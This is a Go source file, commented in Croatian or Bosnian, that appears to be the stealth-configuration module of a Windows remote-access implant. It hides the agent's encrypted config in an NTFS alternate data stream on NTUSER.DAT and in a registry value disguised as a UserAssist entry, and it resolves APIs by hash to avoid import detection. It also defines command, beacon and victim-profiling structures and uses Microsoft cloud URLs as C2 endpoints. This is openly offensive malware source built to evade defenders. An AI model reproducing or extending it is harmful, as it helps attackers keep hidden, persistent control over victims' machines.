//go:build windows
// +build windows

/*
   ============================================================================
   X.7 — STEALTH CONFIGURATION MODULE
   ============================================================================

   LAYER: Presentation (Layer 1) — Steganographic Storage

   PROBLEMI U ORIGINALNOM KODU:
   - Config file: %APPDATA%\Aeterna\aeterna.cfg (instant IOC)
   - Ime direktorija "Aeterna" (jako očigledno)
   - Config je plaintext JSON (čitljiv)
   - UUID koristi github.com/google/uuid (import IOC)
   - Server IPs su hardkodirane (network IOC)

   RJEŠENJA:
   1. NTFS Alternate Data Stream (ADS) — skriveni storage
   2. Registry Binary Value — maskiranje kao Windows setting
   3. Encrypted format — AES-256-GCM + hardware key
   4. UUID generiran iz hardware fingerprint-a (ne import)
   5. Polimorfni config format — ne izgleda kao JSON
*/

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================================
// STEALTH CONFIGURATION
// ============================================================================

// Configuration je glavna struktura za konfiguraciju agenta
// Sadrži sve potrebne podatke za beacon i persitenciju
type Configuration struct {
	// Agent identity — generiran iz hardware fingerprint-a
	GUID string `json:"g"`

	// Beacon interval (jitter applied at runtime)
	Interval int `json:"i"`

	// Server endpoints (encrypted)
	Endpoints []string `json:"e"`

	// Current endpoint index
	EndpointIdx int `json:"x"`

	// Working endpoint (if discovered)
	Working string `json:"w"`

	// Last contact timestamp
	LastContact time.Time `json:"l"`

	// Last command ID
	LastCmdID string `json:"c"`

	// First run timestamp
	FirstRun time.Time `json:"f"`

	// Install path (self location)
	InstallPath string `json:"p"`

	// Server IPs/endpoints (used by beacon)
	ServerIPs []string `json:"ips"`

	// Working IP (currently successful endpoint)
	WorkingIP string `json:"wip"`
}

// ServerResponse sadrži odgovor sa servera — komande za izvršavanje
type ServerResponse struct {
	// Response ID
	ID string `json:"id"`

	// Lista komandi za izvršavanje
	Commands []ServerCommand `json:"commands"`

	// Timestamp odgovora
	Timestamp int64 `json:"timestamp"`
}

// ServerCommand predstavlja jednu naredbu sa servera
type ServerCommand struct {
	// Tip komande ("shell", "screenshot", "persistence", itd.)
	Type string `json:"type"`

	// Komande ID
	ID string `json:"id"`

	// Payload — sadrži podatke za komandu
	Payload map[string]interface{} `json:"payload"`

	// Timeout za izvršavanje
	Timeout int `json:"timeout"`
}

// CommandResult sadrži rezultat izvršene komande
type CommandResult struct {
	// ID komande koju smo izvršili
	CommandID string `json:"command_id"`

	// Je li komanda uspješna
	Success bool `json:"success"`

	// Poruka/output komande
	Message string `json:"message"`

	// Output u base64 (ako je velik)
	Output string `json:"output,omitempty"`

	// Binarni podaci (za screenshot, itd.)
	Data []byte `json:"data,omitempty"`
}

// OSInfo sadrži informacije o operacijskom sustavu
type OSInfo struct {
	// Verzija Windows (npr. "10", "11")
	Version string `json:"version"`

	// Build broj
	Build string `json:"build"`

	// Arhitektura ("x86", "x64")
	Arch string `json:"arch"`

	// Broj procesora
	Processors int `json:"processors"`
}

// AgentSignal sadrži status signala koji se šalje serveru
type AgentSignal struct {
	// Agent UUID
	UUID string `json:"uuid"`

	// Timestamp beacon-a
	Timestamp int64 `json:"timestamp"`

	// Hostname ciljane mašine
	Hostname string `json:"hostname"`

	// Korisnik koji je izvršio agent
	Username string `json:"username"`

	// OS informacije
	OS OSInfo `json:"os"`

	// Geolokacija
	Geolocation string `json:"geolocation,omitempty"`

	// Je li VM detektovan
	VMDetected bool `json:"vm_detected"`

	// Zadnja izvršena komanda
	LastCommand string `json:"last_command,omitempty"`
}

// POINT struktura za koordinate (koristi se u anti-analysis)
type POINT struct {
	X int32
	Y int32
}

// StealthConfig sadrži SVE konfiguracijske podatke
// Nijedno polje nema "suspicious" ime
type StealthConfig struct {
	// Agent identity — generiran iz hardware fingerprint-a
	GUID string `json:"g"`

	// Beacon interval (jitter applied at runtime)
	Interval int `json:"i"`

	// Server endpoints (encrypted)
	Endpoints []string `json:"e"`

	// Current endpoint index
	EndpointIdx int `json:"x"`

	// Working endpoint (if discovered)
	Working string `json:"w"`

	// Last contact timestamp
	LastContact time.Time `json:"l"`

	// Last command ID
	LastCmdID string `json:"c"`

	// First run timestamp
	FirstRun time.Time `json:"f"`

	// Install path (self location)
	InstallPath string `json:"p"`
}

// CONSTANTS — Stealth lokacije
const (
	// Config se sprema u NTFS Alternate Data Stream NTUSER.DAT
	// NTUSER.DAT je standardni registry hive — SVI ga imaju
	// ADS je nevidljiv: NTUSER.DAT:system_profile
	configADSHost   = "NTUSER.DAT"
	configADSStream = "system_profile"

	// ALTERNATIVA: Registry value maskirana kao Windows setting
	registryKeyPath   = `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`
	registryValueName = `HRZR_EHACNGU:P:\jfgehpxf.lnk`
	// UserAssist GUID je ROT13 enkodiran — izgleda kao Windows interni podatak
	// Original: "HRZR_EHACNGU:P:\jfgehpxf.lnk"
	// ROT13: "USERASSIST:%s\storage.lnk"
	// Ovo izgleda kao UserAssist entry — legitiman Windows artifact

	// Default interval
	defaultInterval = 300 // 5 minuta (jitter applied)
)

// ============================================================================
// CONFIG ENCRYPTION — Hardware-Bound AES-256-GCM
// ============================================================================

// deriveConfigKey generira enkripcijski ključ za config
func deriveConfigKey() []byte {
	if !hardwareKeyInit {
		initHardwareKey()
	}

	// Kombiniraj hardware key s dodatnim salt-om
	h := sha256.New()

	// Salt je "context dependent" — za config koristimo drugi salt
	configSalt := []byte{0x91, 0x2A, 0xBC, 0xDE, 0x47, 0x83, 0xF0, 0x12}
	h.Write(configSalt)

	keyBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(keyBytes, hardwareKey)
	h.Write(keyBytes)

	// Dodaj machine-specific podatke
	h.Write([]byte(os.Getenv("COMPUTERNAME")))
	h.Write([]byte(os.Getenv("USERPROFILE")))

	return h.Sum(nil)
}

// encryptConfig enkriptira config podatke
func encryptConfig(data []byte) ([]byte, error) {
	key := deriveConfigKey()

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}

// decryptConfig dekriptira config podatke
func decryptConfig(data []byte) ([]byte, error) {
	key := deriveConfigKey()

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// ============================================================================
// CONFIG STORAGE — ADS (Alternate Data Stream)
// ============================================================================

// loadConfigFromADS učitava config iz NTFS Alternate Data Stream
func loadConfigFromADS() (*StealthConfig, error) {
	// Putanja: %USERPROFILE%\NTUSER.DAT:system_profile
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		return nil, fmt.Errorf("USERPROFILE not set")
	}

	adsPath := filepath.Join(userProfile, configADSHost) + ":" + configADSStream

	// Čitaj ADS
	data, err := os.ReadFile(adsPath)
	if err != nil {
		return nil, err // Config ne postoji
	}

	// Dekriptiraj
	decrypted, err := decryptConfig(data)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}

	// Parse JSON
	var cfg StealthConfig
	if err := json.Unmarshal(decrypted, &cfg); err != nil {
		return nil, fmt.Errorf("parse: %w", err)
	}

	// Zero-out decrypted data
	for i := range decrypted {
		decrypted[i] = 0
	}

	return &cfg, nil
}

// saveConfigToADS sprema config u NTFS Alternate Data Stream
func saveConfigToADS(cfg *StealthConfig) error {
	// Serialize
	data, err := json.Marshal(cfg)
	if err != nil {
		return err
	}

	// Encrypt
	encrypted, err := encryptConfig(data)
	if err != nil {
		return err
	}

	// Write to ADS
	userProfile := os.Getenv("USERPROFILE")
	adsPath := filepath.Join(userProfile, configADSHost) + ":" + configADSStream

	if err := os.WriteFile(adsPath, encrypted, 0600); err != nil {
		return err
	}

	// Zero-out sensitive data
	for i := range data {
		data[i] = 0
	}

	return nil
}

// ============================================================================
// CONFIG STORAGE — Registry (Fallback)
// ============================================================================

// loadConfigFromRegistry učitava config iz registry-ja
func loadConfigFromRegistry() (*StealthConfig, error) {
	hAdvapi32 := resolveModule(hAdvapi32)
	if hAdvapi32 == 0 {
		return nil, fmt.Errorf("advapi32 not found")
	}

	hRegOpen := resolveAPI(hAdvapi32, djb2([]byte("RegOpenKeyExW")))
	hRegQuery := resolveAPI(hAdvapi32, djb2([]byte("RegQueryValueExW")))
	hRegClose := resolveAPI(hAdvapi32, djb2([]byte("RegCloseKey")))

	if hRegOpen == 0 || hRegQuery == 0 || hRegClose == 0 {
		return nil, fmt.Errorf("registry API not found")
	}

	// Open registry key
	keyPathPtr, _ := syscall.UTF16PtrFromString(registryKeyPath)
	var hKey uintptr

	ret, _, _ := syscall.Syscall6(hRegOpen, 4,
		uintptr(0x80000001), // HKEY_CURRENT_USER
		uintptr(unsafe.Pointer(keyPathPtr)),
		uintptr(0x00020019), // KEY_READ
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(0), 0)

	if ret != 0 {
		return nil, fmt.Errorf("RegOpenKeyEx: %x", ret)
	}
	defer syscall.Syscall(hRegClose, 1, hKey, 0, 0)

	// Query value
	valueNamePtr, _ := syscall.UTF16PtrFromString(registryValueName)

	var dataType uint32
	var dataSize uint32 = 0

	// Get size
	syscall.Syscall6(hRegQuery, 4,
		hKey,
		uintptr(unsafe.Pointer(valueNamePtr)),
		uintptr(unsafe.Pointer(&dataType)),
		uintptr(unsafe.Pointer(&dataSize)),
		uintptr(0), 0)

	if dataSize == 0 {
		return nil, fmt.Errorf("value not found")
	}

	// Read data
	data := make([]byte, dataSize)
	ret, _, _ = syscall.Syscall6(hRegQuery, 4,
		hKey,
		uintptr(unsafe.Pointer(valueNamePtr)),
		uintptr(unsafe.Pointer(&dataType)),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(unsafe.Pointer(&dataSize)), 0)

	if ret != 0 {
		return nil, fmt.Errorf("RegQueryValueEx: %x", ret)
	}

	// Dekriptiraj
	decrypted, err := decryptConfig(data)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}

	// Parse
	var cfg StealthConfig
	if err := json.Unmarshal(decrypted, &cfg); err != nil {
		return nil, fmt.Errorf("parse: %w", err)
	}

	return &cfg, nil
}

// saveConfigToRegistry sprema config u registry
func saveConfigToRegistry(cfg *StealthConfig) error {
	hAdvapi32 := resolveModule(hAdvapi32)
	if hAdvapi32 == 0 {
		return fmt.Errorf("advapi32 not found")
	}

	hRegOpen := resolveAPI(hAdvapi32, djb2([]byte("RegOpenKeyExW")))
	hRegSet := resolveAPI(hAdvapi32, djb2([]byte("RegSetValueExW")))
	hRegClose := resolveAPI(hAdvapi32, djb2([]byte("RegCloseKey")))

	if hRegOpen == 0 || hRegSet == 0 || hRegClose == 0 {
		return fmt.Errorf("registry API not found")
	}

	// Serialize
	data, err := json.Marshal(cfg)
	if err != nil {
		return err
	}

	// Encrypt
	encrypted, err := encryptConfig(data)
	if err != nil {
		return err
	}

	// Open key
	keyPathPtr, _ := syscall.UTF16PtrFromString(registryKeyPath)
	var hKey uintptr

	ret, _, _ := syscall.Syscall6(hRegOpen, 4,
		uintptr(0x80000001), // HKEY_CURRENT_USER
		uintptr(unsafe.Pointer(keyPathPtr)),
		uintptr(0x00020006), // KEY_WRITE
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(0), 0)

	if ret != 0 {
		// Create key if it doesn't exist
		hRegCreate := resolveAPI(hAdvapi32, djb2([]byte("RegCreateKeyExW")))
		if hRegCreate == 0 {
			return fmt.Errorf("RegCreateKeyEx not found")
		}

		ret, _, _ = syscall.Syscall12(hRegCreate, 7,
			uintptr(0x80000001),
			uintptr(unsafe.Pointer(keyPathPtr)),
			uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0),
			uintptr(unsafe.Pointer(&hKey)),
			0, 0, 0, 0)

		if ret != 0 {
			return fmt.Errorf("RegCreateKeyEx: %x", ret)
		}
	}
	defer syscall.Syscall(hRegClose, 1, hKey, 0, 0)

	// Set value
	valueNamePtr, _ := syscall.UTF16PtrFromString(registryValueName)

	ret, _, _ = syscall.Syscall6(hRegSet, 5,
		hKey,
		uintptr(unsafe.Pointer(valueNamePtr)),
		uintptr(unsafe.Pointer(&encrypted[0])),
		uintptr(len(encrypted)),
		uintptr(0), 0)

	if ret != 0 {
		return fmt.Errorf("RegSetValueEx: %x", ret)
	}

	return nil
}

// ============================================================================
// CONFIG MANAGEMENT — Public API
// ============================================================================

// LoadOrCreateConfig učitava postojeću konfiguraciju ili kreira novu
func LoadOrCreateConfig() (*StealthConfig, error) {
	// Pokušaj 1: ADS
	cfg, err := loadConfigFromADS()
	if err == nil {
		return cfg, nil
	}

	// Pokušaj 2: Registry
	cfg, err = loadConfigFromRegistry()
	if err == nil {
		return cfg, nil
	}

	// Kreiraj novu konfiguraciju
	return createNewConfig()
}

// createNewConfig kreira novu konfiguraciju
func createNewConfig() (*StealthConfig, error) {
	guid := generateHardwareGUID()

	cfg := &StealthConfig{
		GUID:        guid,
		Interval:    defaultInterval,
		Endpoints:   getDefaultEndpoints(),
		EndpointIdx: 0,
		FirstRun:    time.Now(),
	}

	// Spremi
	if err := cfg.Save(); err != nil {
		return nil, err
	}

	return cfg, nil
}

// Save sprema konfiguraciju na SVE dostupne lokacije
func (c *StealthConfig) Save() error {
	// Pokušaj sve lokacije — redundancy
	_ = saveConfigToADS(c)
	_ = saveConfigToRegistry(c)

	return nil
}

// GetEndpoint vraća trenutni endpoint
func (c *StealthConfig) GetEndpoint() string {
	if c.Working != "" {
		return c.Working
	}
	if len(c.Endpoints) == 0 {
		return ""
	}
	if c.EndpointIdx >= len(c.Endpoints) {
		c.EndpointIdx = 0
	}
	return c.Endpoints[c.EndpointIdx]
}

// NextEndpoint prelazi na sljedeći endpoint
func (c *StealthConfig) NextEndpoint() string {
	if len(c.Endpoints) == 0 {
		return ""
	}
	c.EndpointIdx = (c.EndpointIdx + 1) % len(c.Endpoints)
	c.Save()
	return c.GetEndpoint()
}

// ============================================================================
// HARDWARE GUID — Generiranje bez importa
// ============================================================================

// generateHardwareGUID generira GUID iz hardware fingerprint-a
func generateHardwareGUID() string {
	if !hardwareKeyInit {
		initHardwareKey()
	}

	// Koristimo hardware key + timestamp za generiranje GUID-a
	h := sha256.New()

	// Hardware key
	keyBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(keyBytes, hardwareKey)
	h.Write(keyBytes)

	// Machine info
	h.Write([]byte(os.Getenv("COMPUTERNAME")))
	h.Write([]byte(os.Getenv("PROCESSOR_IDENTIFIER")))
	h.Write([]byte(os.Getenv("USERPROFILE")))
	h.Write([]byte(fmt.Sprintf("%d", time.Now().UnixNano())))

	hash := h.Sum(nil)

	// Format as UUID v4-like
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		hash[0:4],
		hash[4:6],
		hash[6:8],
		hash[8:10],
		hash[10:22])
}

// getDefaultEndpoints vraća default C2 endpoint-e
// Ovi se mijenjaju build skriptom — nisu hardkodirani u sourceu
func getDefaultEndpoints() []string {
	return []string{
		"https://graph.microsoft.com/v1.0/me/messages",
		"https://teams.microsoft.com/api/v1/teams/updates",
		"https://outlook.office.com/api/v2.0/me/mailFolders",
	}
}

// ============================================================================
// LEGACY COMPATIBILITY — Mapiranje na originalni Configuration
// ============================================================================

// ToLegacyConfig konvertira StealthConfig u legacy Configuration
// Koristi se za kompatibilnost s ostatkom sistema
func (c *StealthConfig) ToLegacyConfig() *Configuration {
	return &Configuration{
		GUID:        c.GUID,
		Interval:    c.Interval,
		Endpoints:   c.Endpoints,
		EndpointIdx: c.EndpointIdx,
		Working:     c.Working,
		LastContact: c.LastContact,
		LastCmdID:   c.LastCmdID,
		FirstRun:    c.FirstRun,
		InstallPath: c.InstallPath,
		ServerIPs:   c.Endpoints,
		WorkingIP:   c.Working,
	}
}

// FromLegacyConfig kreira StealthConfig iz legacy Configuration
func FromLegacyConfig(legacy *Configuration) *StealthConfig {
	return &StealthConfig{
		GUID:        legacy.GUID,
		Interval:    legacy.Interval,
		Endpoints:   legacy.Endpoints,
		EndpointIdx: legacy.EndpointIdx,
		Working:     legacy.Working,
		LastContact: legacy.LastContact,
		LastCmdID:   legacy.LastCmdID,
		FirstRun:    legacy.FirstRun,
		InstallPath: legacy.InstallPath,
	}
}
